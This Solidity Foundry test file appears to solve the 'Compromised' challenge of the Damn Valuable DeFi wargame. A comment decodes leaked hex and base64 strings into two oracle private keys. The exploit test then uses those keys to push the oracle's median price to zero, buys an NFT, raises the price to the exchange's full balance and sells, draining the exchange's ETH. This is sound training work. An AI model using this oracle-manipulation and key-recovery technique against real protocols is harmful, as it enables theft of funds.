// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {TrustfulOracleInitializer} from "../src/compromised/TrustfulOracleInitializer.sol";
import {TrustfulOracle} from "../src/compromised/TrustfulOracle.sol";
import {Exchange} from "../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";

/*  
4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34


const leakToPrivateKey = (leak) => {
    const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(`utf8`)
    const hexKey = Buffer.from(base64, `base64`).toString(`utf8`)
    return hexKey
}

async function main() {
    const leakedInformation = [
        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34",
    ]
    const privateKey1 = leakToPrivateKey(leakedInformation[0])
    const privateKey2 = leakToPrivateKey(leakedInformation[1])
    console.log(privateKey1)
    console.log(privateKey2)
}

main().catch((error) => {
    console.error(error)
    process.exitCode = 1
})

=>
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
*/

contract CompromisedTest is Test {
    TrustfulOracle oracle;
    TrustfulOracleInitializer oracleInit;
    Exchange exchange;
    DamnValuableNFT nftToken;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 INITIAL_NFT_PRICE = 999 ether;
    uint256 EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;

    address[] sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];
    uint256[] initialPrices = [
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
        }

        // Player starts with limited balance
        deal(player, 0.1 ether);
        assertEq(player.balance, 0.1 ether);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracleInit = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        );
        oracle = oracleInit.oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange(address(oracle));
        deal(address(exchange), EXCHANGE_INITIAL_ETH_BALANCE);
        nftToken = exchange.token();

        // ownership renounced
        assertEq(nftToken.owner(), address(0));
        assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
    }

    function testExploit() public {
        address oracle1 = vm.addr(
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        );
        address oracle2 = vm.addr(
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        );
        assertEq(oracle1, sources[1]);
        assertEq(oracle2, sources[2]);

        vm.startPrank(oracle1);
        oracle.postPrice(nftToken.symbol(), 0);
        vm.stopPrank();

        vm.startPrank(oracle2);
        oracle.postPrice(nftToken.symbol(), 0);
        vm.stopPrank();

        assertEq(oracle.getMedianPrice(nftToken.symbol()), 0);

        vm.prank(player);
        uint256 id = exchange.buyOne{value: 0.01 ether}();

        // new price
        vm.startPrank(oracle1);
        oracle.postPrice(nftToken.symbol(), address(exchange).balance);
        vm.stopPrank();

        vm.startPrank(oracle2);
        oracle.postPrice(nftToken.symbol(), address(exchange).balance);
        vm.stopPrank();

        vm.startPrank(player);
        nftToken.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();

        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);
        // Player's ETH balance must have significantly increased
        assertGt(player.balance, 0.1 ether);
        // Player must not own any NFT
        assertEq(nftToken.balanceOf(player), 0);
        // NFT price shouldn't have changed_
        assertEq(oracle.getMedianPrice(nftToken.symbol()), INITIAL_NFT_PRICE);
    }
}
